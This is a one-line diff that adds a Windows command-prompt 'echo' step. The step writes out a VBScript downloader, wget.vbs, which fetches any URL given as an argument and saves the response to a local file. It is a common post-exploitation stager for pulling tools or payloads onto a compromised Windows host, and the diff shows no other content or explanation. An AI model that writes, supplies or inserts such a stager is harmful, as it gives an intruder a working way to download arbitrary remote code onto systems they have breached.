@@ -1,0 +1,1 @@
+echo strUrl = WScript.Arguments.Item(0):StrFile = WScript.Arguments.Item(1):Set Post = CreateObject(^"Msxml2.XMLHTTP^"):Set Shell = CreateObject(^"Wscript.Shell^"):Post.Open ^"GET^",strUrl,0:Post.Send():Set aGet = CreateObject(^"ADODB.Stream^"):aGet.Mode = 3:aGet.Type = 1:aGet.Open():aGet.Write(Post.responseBody):aGet.SaveToFile StrFile,2 > wget.vbs
